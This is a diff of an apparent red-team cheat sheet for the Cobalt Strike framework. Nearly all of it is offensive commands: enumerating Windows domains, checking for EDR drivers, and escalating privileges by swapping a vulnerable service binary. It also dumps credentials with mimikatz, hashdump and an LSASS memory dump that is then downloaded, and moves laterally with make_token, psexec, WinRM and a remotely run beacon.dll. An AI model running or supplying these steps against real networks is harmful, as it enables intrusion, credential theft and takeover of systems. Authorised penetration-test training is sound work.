@@ -106,6 +106,8 @@ stage {
     set name             "changeme.dll";
 }
 
+Run c2lint against your new profile to check for possible OPSEC issues.
+
 Review /opt/cobaltstrike/malleable-c2-profiles/normal/reference.profile for more default settings.
 
 See also:
@@ -261,98 +263,109 @@ This is helpful to know when HTTP/S requests are accessing your team server.
 # Interact with a Beacon
 
 Right-click on a Beacon > Interact
-help                                              Show available help commands
+help                                              Help menu
 help <command>                                    Get more help on a particular command
 ctrl +/-                                          Increase or decrease the font size
 ctrl k                                            Clear the window
 
-Right-click the X to rename or detach to a floating window.
+By default, Beacon will check in every 60 seconds.
+sleep 10                                          Set Beacon sleep time to 10 seconds
+sleep 20 10                                       Set Beacon sleep time to 20 seconds with a 10% jitter (18-22s)
+sleep 0                                           Make a Beacon interactive
+
+- Beacon Object File (BOF)
+A compiled C program that executes within a Beacon.
+It can call Win32 and Beacon APIs without spawning and injecting into a new process.
+It is used to run small commands for a short time.
 
 Cobalt Strike > Script Manger > Load
 /opt/cobaltstrike/third-party/outflanknl-helpcolor/HelpColor.cna
 helpx                                             OPSEC color coded commands
 
-By default, Beacon will check in every 60 seconds.
-sleep 0                                           Make a Beacon interactive
-sleep 10                                          Make a Beacon call home every 10 seconds
-sleep 90 10                                       Make a Beacon call home every 90 seconds with a 10% jitter
-
 - Jobs
-jobs                                              Show running jobs
-kill <JID>                                        Kill a specific job
+jobs                                              List long-running post-exploitation tasks
+kill <JID>                                        Kill a process
 
 - Misc
-Use the up arrow to scroll through previous commands.
 Beacon is fully tab-completable.
+Use the up arrow to scroll through previous commands.
 All commands and their output are written to the logs directory.
 Right-click on the X in the tab for additional options.
+https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/appendix-a_beacon-opsec-considerations.htm
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Situational awareness
 
-- Beacon Object File (BOF)
-A compiled C program that executes within Beacon and can call Win32 and Beacon APIs without spawning and injecting into a new process. They run small
-commands for a short time.
-
 Cobalt Strike > Script Manger > Load
 /opt/cobaltstrike/third-party/trustedsec-bof/SA/SA.cna
-helpx                                              New commands added to 'help'
+helpx                                             New BOF commands added
 
-whoami
-net domain
-net user
-net computers
-net domain_controllers
+whoami                                            BOF
+netuser <username>                                BOF - List user info
+ipconfig                                          BOF
+listdns                                           BOF - List DNS cache entries
+routeprint                                        BOF - Print IPv4 routes on the machine
+netstat                                           BOF - List listening and connected IPv4 UDP and TCP connections
+userenum                                          BOF - List computer user accounts
+netLocalGroupList                                 BOF - List groups in this server
+netLocalGroupListMembers <group>                  BOF - List the members in the specified group in this server
+netsession                                        BOF - List sessions on server
+netshares                                         BOF - List shares on local local or remote computer
+pwd                                               Print current directory
+dir                                               BOF - List a target directory
+driversigs                                        BOF - Check drivers for known EDR vendor names
+drives                                            List drives on target
+history                                           Show the command history of the Beacon
 
-View > Targets                                    Discovered hosts will populate this tab
+arp                                               BOF - Runs an internal ARP command
+domainenum                                        BOF - List user accounts in the current domain
+netview                                           BOF - List local workstations and servers
+net domain                                        Show the current domain
+net domain_controllers                            Show domain controllers
+net computers                                     Show doamin computers (this can take a couple of min, be patient)
 
-ps                                                Show running processes
+View > Targets                                    Discovered targets will populate
 
-screenshot <PID> x64                              Take a screenshot (look for svchost from the current user)
+ps                                                Show process list
+
+screenshot <PID> x64                              Take a single screenshot (look for svchost from the current user)
                                                   View > Screenshots
 
-keylogger <PID> x64                               Inject a keystroke logger into a process (look for svchost from the current user)
+keylogger <PID> x64                               Start a keystroke logger (look for svchost from the current user)
                                                   View > Keystrokes
-sleep
-portscan <target range> <ports> none 255
-Go to the Targets tab, select all the targets > right-click > Services
 
-Beacon Command Behavior and OPSEC Considerations
-https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/appendix-a_beacon-opsec-considerations.htm
-------------------------------------------------------------------------------------------------------------------------------------------------------
+Right-click on the Beacon > Explore > File Browser
+Right-click on a file > Download
 
-# Clean up
-
-Select a particular Beacon > exit                 Beacon to no longer check in
-Right click on the Beacon > Session > Remove      Remove the dead Beacon
-
-Site Management > Manage
-Select each line > Kill                           Remove any Scripted Payload Delivery
+portscan <target range> <ports> none 255          Scan a network for open services
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Privilege Escalation
 
-- Built in
-getsystem                                         SYSTEM account impersonation using named pipes
-elevate svc-exe                                   Select your Beacon. Creates a SYSTEM service that will run our payload
-elevate uac-token-duplication                     Select your Beacon. Bypass UAC, this gives you a pseudo-high integrity token
-
-run wmic service get name, pathname               Check for unquoted service paths
+getsystem                                         BOF - Attemp to get SYSTEM
+getprivs                                          Enable system privileges on current token
+getuid                                            Get User ID
 
 - PowerUp
 powershell-import /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1
-powershell Invoke-PrivescAudit                    Look for a vulnerable service
-Attacks > Packages > Windows Executable (S)       Output: Windows Service EXE
-upload /path/to/new/exe
-run sc start <vulnerable service>
+powerpick Invoke-PrivescAudit; "done"             Look for a vulnerable service
+Attacks > Packages > Windows Executable (S) > choose your listener
+Output: Windows Service EXE
+Use the same name of the vulnerable service binary
+cd to the vulnerable binary location
+upload /path/to/new/payload
+sc_stop <vuln service name>                       If the vulnerable service is running, stop it
+sc_start <vuln service name>                      Start the vulnerable service, which runs the malicious payload
 
 - Seatbelt
-execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe powershell
-execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -group=system
+execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe PowerShell
+execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe DotNet
 execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -group=user
-execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -q TokenGroups
-execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -q InterestingProcesses
-execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -q KeePass
+execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -group=system
+execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -group=slack
+execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -group=chromium
+execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -group=remote
+execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -group=misc
 
 - SharpUp
 execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/SharpUp.exe audit
@@ -360,13 +373,19 @@ execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/SharpUp.exe audit
 
 # Credential Abuse
 
-hashdump                                          Recover local account password hashes
-logonpasswords                                    Harvest credentials with mimikatz
+hashdump                                          Dump password hashes
+logonpasswords                                    Dump credentials and hashes with mimikatz
 View > Credentials
 
+prodump <PID of lsass.exe> <C:/Temp/dump.txt>     BOF - Dumps the specified process to the specified output file
+Right-click on the Beacon > Explore > File Browser
+Browse to the same location as the dump
+Right-click on the file > Download
+
 execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe CredGuard
+execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe KeePass
 execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe LSASettings
-execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -q SecPackageCreds
+execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe SecPackageCreds
 
 execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Rubeus.exe dump
 execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Rubeus.exe logonsession
@@ -400,8 +419,16 @@ lsadump::<module>                                 Interact with the Local Securi
 
 # Lateral movement
 
-make_token <domain\user> <password>
-ls \\<computer>\C$                                Check to see if you have access
+Right-click on a SYSTEM Beacon > Access > Make Token
+Select a user > Build
+
+powershell-import /usr/share/windows-resources/powersploit/Recon/PowerView.ps1
+powerpick Get-DomainUser <user>                   Show groups a user belongs to
+powerpick Get-DomainComputer -Ping -Properties dnshostname; "done"
+powerpick Get-NetLocalGroupMember <FQDN>          List users the administrator group on a remote computer
+
+ls \\<FQDN>\C$                                    BOF - Check to see if you have access
+
 jump <psexec, psexec64, psexec_psh, winrm, winrm64> <computer> <listener>
 
 schtasks /create /s <IP> /tn <name> /u <user> /sc <frequency> /p <password> /st <time> /sd <date> <command>
@@ -419,11 +446,6 @@ jump psexec                                       Run service EXE on remote host
 jump psexec_psh                                   Run a PowerShell one-liner on remote host via a service
 jump winrm                                        Run a PowerShell script via WinRM on remote host
 remote-exec <any of the above>                    Run a single command using the above methods on remote host
-
-powershell-import /usr/share/windows-resources/powersploit/Recon/PowerView.ps1
-powerpick get-domainuser <user>
-powerpick Get-DomainComputer -Ping -Properties dnshostname
-powerpick Get-NetLocalGroupMember <computer>      List the local administrators group on a computer
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Process injection
@@ -440,3 +462,12 @@ spawnto <arch> <full-exe-path>                    Process hollowing
 upload /tmp/beacon.dll                            Upload your malicious DLL
 ls                                                Verify it was uploadted
 remote-exec wmi <FQDN> rundll32 c:\windows\temp\beacon.dll,start
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Clean up
+
+Select a particular Beacon > exit                 Beacon to no longer check in
+Right click on the Beacon > Session > Remove      Remove the dead Beacon
+
+Site Management > Manage
+Select each line > Kill                           Remove any Scripted Payload Delivery
